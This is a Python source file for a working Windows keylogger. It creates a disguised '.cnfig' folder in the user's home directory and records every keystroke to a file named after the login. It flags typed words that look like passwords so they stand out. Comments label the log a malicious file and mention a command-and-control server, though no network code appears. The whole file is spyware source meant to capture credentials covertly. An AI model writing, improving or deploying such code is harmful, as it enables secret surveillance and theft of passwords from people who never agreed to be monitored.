#RUN.PY
'''
    :O
'''
import threading 
from functools import partial
from pynput import keyboard
import os
import re

stop_event = threading.Event()
buffer_local= []
filename = os.getlogin() + ".txt"
dirname = ".cnfig"

def setupFiles(path):
    new_dir = os.path.join(path, dirname)
    
    if not (os.path.exists(new_dir)):
        os.makedirs(new_dir, exist_ok=True)
        print(f'Dir made: {new_dir}')
    
    #create maliciious file
    file_dir = os.path.join(new_dir, filename)
    files = [f for f in os.listdir(new_dir)]
    
    if len(files) == 0:
        with open(file_dir, 'a') as file:
            pass
    
    return file_dir

def checkfile():
    try: 
        path = os.path.join("C:\\Users", os.getlogin())
        if os.path.exists(path):
            return (setupFiles(path))

            #   --1
        else:
            return Exception 
    except Exception as e:
        return e

def check_pass(password) -> bool:
    pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
    match = re.match(pattern, password)
    return bool(match)

word = ""
buffer_words = []
stop_event = threading.Event()

global FILE_PATH_LOG
def get_path(path):
    FILE_PATH_LOG = path


def keyPressedF(key, file_path):
    global word
    
    #file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
    
    with open(file_path,'a') as log_file:
        try:
            if hasattr(key, 'char'):  # Regular character
                word += key.char

            elif key == keyboard.Key.space:  # Space key
                log_file.write(word + " " + "\n")  # Add the current word to the buffer
                word = ""  # Reset the word

            elif key == keyboard.Key.enter:  # Enter key
                if check_pass(word):
                    word = "¿" + word  # Mark password-like words
                log_file.write(word + "\n")
                word = ""  # Reset the word

            elif key == keyboard.Key.backspace:  # Backspace key
                # Remove the last character from the current word, if any
                word = word[:-1]

            elif key == keyboard.Key.delete:  # Delete key
                # Optional: Handle delete key, e.g., log a delete event
                log_file.write("[DELETE]\n")

            elif key in (keyboard.Key.alt, keyboard.Key.tab):  # Alt or Tab keys
                log_file.write(f"[{key.name.upper()}]\n")  # Log the special key press

            elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):  # Modifier keys
                # Optionally log modifier key presses
                log_file.write(f"[{key.name.upper()}]\n")

            else:
                # Log any unhandled special key presses
                log_file.write(f"[{key}]\n")
        except Exception as e:
            print("Error:", e)


def keyboard_logger_pathed_without_timer(path):
    print(os.getpid())
    keyPressed_with_path = partial(keyPressedF, file_path=path)

    listner = keyboard.Listener(on_press = keyPressed_with_path)
    listner.start()
    #time.sleep(5)

    try:
        while not stop_event.is_set():
            threading.Event().wait(0.1)
    finally:
        listner.stop()
    
    #listner.stop()
    buffer_local = buffer_words
    #print(buffer_words)

def run():
    #store_file -> file path for logger
    #bfr -> temporary store for words captured
    #RF -> binary flag for running the script or not
    

    #check for file
    
    store_file = checkfile()
    print(store_file)
    
    #check for server conn
    
    #run keylogger    
    t1 = threading.Thread(target=keyboard_logger_pathed_without_timer, name='logger', args=(store_file,))
    inp = -1
    t1.start()
    while inp < 0:
        inp = int(input())
        
    stop_event.set()
    t1.join()

    
    #terminate connection upon recieving signal from C&C
    print()        

if __name__ == "__main__":
    run()
